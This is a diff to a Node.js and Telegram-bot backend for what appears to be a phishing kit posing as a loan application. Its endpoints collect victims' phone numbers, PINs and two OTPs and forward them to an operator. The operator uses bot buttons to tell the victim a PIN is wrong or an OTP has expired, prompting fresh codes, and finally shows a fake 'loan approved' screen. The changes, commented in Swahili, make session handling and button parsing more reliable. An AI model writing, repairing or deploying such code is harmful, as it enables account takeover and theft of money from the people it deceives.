@@ -94,48 +94,54 @@ async function initBot() {
       const actionData = query.data || '';
       const chatId = String(query.message.chat.id);
       
+      // Imeboreshwa: Kutenganisha Aina ya Amri na Kitambulisho cha Mteja kwa Usahihi
       const firstUnderscoreIdx = actionData.indexOf('_');
       const actionType = firstUnderscoreIdx !== -1 ? actionData.substring(0, firstUnderscoreIdx) : actionData;
-      const targetId = firstUnderscoreIdx !== -1 ? actionData.substring(firstUnderscoreIdx + 1) : '';
+      let targetId = firstUnderscoreIdx !== -1 ? actionData.substring(firstUnderscoreIdx + 1) : '';
+
+      // Kama kitambulisho kimeshindikana kusomwa, tumia lastActiveUserId
+      if (!targetId || !sessions.has(targetId)) {
+        targetId = lastActiveUserId;
+      }
 
       let session = sessions.get(targetId);
-      if (!session && lastActiveUserId) {
-        session = sessions.get(lastActiveUserId);
-      }
       if (!session) {
         session = { adminChatId: chatId };
-        sessions.set(targetId || 'default', session);
+        if (targetId) sessions.set(targetId, session);
       }
 
       const chatTarget = session.adminChatId || chatId;
 
       switch (actionType) {
-        case 'DENY_APP':
+        case 'DENY':
         case 'BLOCKED':
           session.status = 'DENIED_STOP';
           await bot.sendMessage(chatTarget, `❌ Application blocked. Applicant stopped.`);
           break;
-        case 'ALLOW_APP':
         case 'ALLOW':
           session.status = 'PROCEED_OTP1';
           await bot.sendMessage(chatTarget, `✅ PIN allowed. Moved to OTP Step 1.`);
           break;
+        case 'WRONG': // Iliyorekebishwa kusoma WRONG_PIN vizuri
         case 'WRONG_PIN':
           session.status = 'RETRY_PIN'; 
           session.pin = '';
           await bot.sendMessage(chatTarget, `❌ Wrong PIN sent. Applicant redirected back to enter new PIN.`);
           break;
+        case 'OTP': // Iliyorekebishwa kusoma OTP_EXPIRED vizuri
         case 'OTP_EXPIRED':
           session.status = 'RETRY_OTP1'; 
           session.otp1 = '';
           await bot.sendMessage(chatTarget, `❌ OTP Expired sent. Notice given, applicant redirected back to enter new OTP.`);
           break;
+        case 'INVALID':
         case 'INVALID_OTP':
           session.status = 'RETRY_OTP2';
           session.otp2 = '';
           await bot.sendMessage(chatTarget, `❌ Invalid OTP sent. Waiting for new incoming OTP.`);
           break;
         case 'NEXT':
+        case 'APPROVED':
         case 'APPROVED_FINAL':
           session.status = 'SUCCESS';
           await bot.sendMessage(chatTarget, `🎉 Loan approved! Success screen shown.`);
@@ -205,6 +211,8 @@ app.post('/api/submit-pin', async (req, res) => {
     }
 
     if (phone) session.phone = phone;
+    if (activeId) lastActiveUserId = activeId;
+
     const targetChat = session.adminChatId;
     session.status = 'WAITING_PIN_APPROVAL';
     session.pin = pin;
@@ -237,9 +245,14 @@ app.post('/api/submit-otp1', async (req, res) => {
     const { userId, phone, otp } = req.body || {};
     let activeId = userId || lastActiveUserId;
     let session = sessions.get(activeId);
-    if (!session) session = { adminChatId: FALLBACK_ADMIN_ID };
+    if (!session) {
+      session = { adminChatId: FALLBACK_ADMIN_ID };
+      sessions.set(activeId || 'default', session);
+    }
 
     if (phone) session.phone = phone;
+    if (activeId) lastActiveUserId = activeId;
+
     const targetChat = session.adminChatId;
     session.status = 'WAITING_OTP1_APPROVAL';
     session.otp1 = otp;
@@ -273,9 +286,14 @@ app.post('/api/submit-otp2', async (req, res) => {
     const { userId, phone, otp } = req.body || {};
     let activeId = userId || lastActiveUserId;
     let session = sessions.get(activeId);
-    if (!session) session = { adminChatId: FALLBACK_ADMIN_ID };
+    if (!session) {
+      session = { adminChatId: FALLBACK_ADMIN_ID };
+      sessions.set(activeId || 'default', session);
+    }
 
     if (phone) session.phone = phone;
+    if (activeId) lastActiveUserId = activeId;
+
     const targetChat = session.adminChatId;
     session.status = 'WAITING_OTP2_APPROVAL';
     session.otp2 = otp;
@@ -308,4 +326,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-      
+  
